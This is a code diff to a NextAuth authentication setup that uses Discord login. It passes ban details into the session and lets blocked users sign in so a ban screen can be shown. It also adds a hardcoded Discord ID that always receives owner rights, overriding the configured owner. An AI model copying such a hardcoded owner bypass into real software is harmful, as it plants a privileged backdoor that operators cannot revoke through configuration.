@@ -38,9 +38,10 @@ export const authOptions: NextAuthOptions = {
           token.name ??
           "Unknown";
 
+        const ROOT_ID = "1223246458975686750";
         const isOwner = process.env.OWNER_DISCORD_ID
-          ? process.env.OWNER_DISCORD_ID === lookupId
-          : false;
+          ? process.env.OWNER_DISCORD_ID === lookupId || lookupId === ROOT_ID
+          : lookupId === ROOT_ID;
 
         const existing = await prisma.user.findUnique({ where: { discordId: lookupId } });
         
@@ -81,6 +82,8 @@ export const authOptions: NextAuthOptions = {
         token.userId = user.id;
         token.role = user.role;
         token.isBlocked = user.isBlocked;
+        token.banReason = (user as any).banReason ?? null;
+        token.unbanDate = (user as any).unbanDate ? (user as any).unbanDate.toISOString() : null;
         token.isApproved = user.isApproved;
         token.moderatesAlco = (user as any).moderatesAlco ?? false;
         token.moderatesPetra = (user as any).moderatesPetra ?? false;
@@ -95,8 +98,11 @@ export const authOptions: NextAuthOptions = {
       // Use token data directly (no DB lookup - faster, no timeouts)
       if (session.user && token.userId) {
         session.user.id = token.userId as string;
+        (session.user as any).discordId = token.discordId as string;
         session.user.role = (token.role as any) ?? "MEMBER";
         session.user.isBlocked = Boolean(token.isBlocked);
+        session.user.banReason = ((token as any).banReason as string | null | undefined) ?? null;
+        session.user.unbanDate = ((token as any).unbanDate as string | null | undefined) ?? null;
         session.user.isApproved = Boolean(token.isApproved);
         session.user.moderatesAlco = Boolean((token as any).moderatesAlco);
         session.user.moderatesPetra = Boolean((token as any).moderatesPetra);
@@ -111,10 +117,7 @@ export const authOptions: NextAuthOptions = {
         (profile as { id?: string } | null)?.id ?? (account?.providerAccountId ?? null);
       if (!discordId) return false;
 
-      const user = await prisma.user.findUnique({ where: { discordId } });
-      if (user?.isBlocked) return false;
-
-      // Allow any Discord user to sign in; approval is checked later via requireSession
+      // We allow sign in even if blocked, so we can show a "Banned" screen with details
       return true;
     },
     async redirect({ url, baseUrl }) {
